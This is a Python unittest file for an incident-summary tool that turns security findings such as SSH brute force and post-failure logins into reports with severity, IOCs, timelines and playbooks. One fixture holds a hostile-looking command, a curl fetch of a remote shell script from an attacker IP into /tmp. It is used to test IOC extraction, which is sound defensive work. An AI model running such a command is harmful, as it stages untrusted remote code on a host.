"""
Tests for incident_summary.py — run from project-02/:  python3 -m unittest -v tests.test_incident_summary
"""
import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
import incident_summary as inc  # noqa: E402

HERE = os.path.dirname(__file__)
FINDINGS = os.path.join(HERE, "..", "data", "findings.json")
CSV = os.path.join(HERE, "..", "data", "alerts_sample.csv")


def F(sev, title, ip="203.0.113.1", users=("root",), t="2026-09-14 01:00:00", n=1, mitre="T1110.001 Password Guessing", detail=""):
    return {"id": "X", "severity": sev, "title": title, "source_ip": ip, "users": list(users),
            "first_seen": t, "last_seen": t, "event_count": n, "evidence_lines": [], "mitre_attack": mitre, "detail": detail}


class SeverityLogic(unittest.TestCase):
    def test_overall_severity_is_worst_finding(self):
        self.assertEqual(inc.overall_severity([F("LOW", "a"), F("CRITICAL", "b"), F("MEDIUM", "c")]), "CRITICAL")
        self.assertEqual(inc.overall_severity([]), "INFO")

    def test_priority_mapping(self):
        self.assertEqual(inc.PRIORITY["CRITICAL"][0], "P1")
        self.assertEqual(inc.PRIORITY["LOW"][0], "P4")

    def test_risk_score_bounds_and_monotonic(self):
        self.assertEqual(inc.risk_score([]), 0)
        one = inc.risk_score([F("MEDIUM", "a")])
        many = inc.risk_score([F("MEDIUM", "a")] * 5)
        self.assertLess(one, many)
        self.assertLessEqual(inc.risk_score([F("CRITICAL", "a")] * 50), 100)

    def test_confidence_levels(self):
        self.assertTrue(inc.confidence([F("MEDIUM", "a")]).startswith("LOW"))
        self.assertTrue(inc.confidence([F("CRITICAL", "a"), F("HIGH", "b"), F("HIGH", "c")]).startswith("HIGH"))


class CorrelationAndIOCs(unittest.TestCase):
    def test_attack_chain_is_named_when_bf_then_success(self):
        fs = [F("HIGH", "SSH brute force (many failures from one source)"),
              F("CRITICAL", "Successful login after failure burst (likely compromised credential)", t="2026-09-14 01:02:00")]
        story = inc.correlate(fs)
        self.assertIn("Chain:", story[0])

    def test_iocs_dedupe_ips_and_flag_commands(self):
        fs = [F("HIGH", "brute force", ip="203.0.113.5"), F("HIGH", "brute force", ip="203.0.113.5"),
              F("HIGH", "Privileged command fetched/staged a remote payload", ip="local", detail="'root' ran as root: /usr/bin/curl -s http://203.0.113.5/x.sh -o /tmp/x.sh")]
        io = inc.iocs(fs)
        self.assertEqual(sum(1 for i in io if i["type"] == "IPv4"), 1)
        cmds = [i for i in io if i["type"] == "Command"]
        self.assertEqual(len(cmds), 1)
        self.assertTrue(cmds[0]["value"].startswith("/usr/bin/curl"))

    def test_playbook_lookup(self):
        self.assertIn("Isolate host", inc.playbook_for("Successful login after failure burst"))
        self.assertIn("Triage manually", inc.playbook_for("Something unknown"))


class EndToEnd(unittest.TestCase):
    def test_json_input_full_build(self):
        summary, findings = inc.load_findings_json(FINDINGS)
        r = inc.build(summary, findings, "tester", FINDINGS)
        self.assertEqual(r["severity"], "CRITICAL")
        self.assertEqual(r["priority"], "P1")
        self.assertEqual(len(r["timeline"]), len(findings))
        self.assertTrue(r["incident_id"].startswith("GS-INC-"))
        # deterministic id for same source path
        self.assertEqual(r["incident_id"], inc.build(summary, findings, "tester", FINDINGS)["incident_id"])

    def test_csv_input(self):
        summary, findings = inc.load_findings_csv(CSV)
        self.assertEqual(len(findings), 3)
        self.assertEqual(findings[0]["severity"], "HIGH", "must be sorted by severity")
        r = inc.build(summary, findings, "tester", CSV)
        self.assertEqual(r["priority"], "P2")
        self.assertEqual(r["events_analysed"], 56)

    def test_renderers_produce_all_sections(self):
        summary, findings = inc.load_findings_json(FINDINGS)
        r = inc.build(summary, findings, "tester", FINDINGS)
        md, ht = inc.to_markdown(r), inc.to_html(r)
        for sec in ("Executive summary", "Attack narrative", "Timeline", "Indicators of Compromise", "MITRE ATT&CK", "Escalation"):
            self.assertIn(sec, md)
            self.assertIn(sec.replace("&", "&amp;"), ht)
        self.assertIn("<!doctype html>", ht)

    def test_cli_writes_files(self):
        with tempfile.TemporaryDirectory() as d:
            md, js = os.path.join(d, "o.md"), os.path.join(d, "o.json")
            rc = inc.main(["--findings", FINDINGS, "--md", md, "--json", js, "--quiet"])
            self.assertEqual(rc, 0)
            self.assertTrue(os.path.getsize(md) > 1000)
            self.assertEqual(json.load(open(js))["severity"], "CRITICAL")

    def test_empty_findings_do_not_crash(self):
        r = inc.build({"total_events": 0}, [], "t", "none")
        self.assertEqual(r["severity"], "INFO")
        self.assertIn("No findings.", r["executive_summary"][2])
        inc.to_markdown(r); inc.to_html(r)


if __name__ == "__main__":
    unittest.main(verbosity=2)
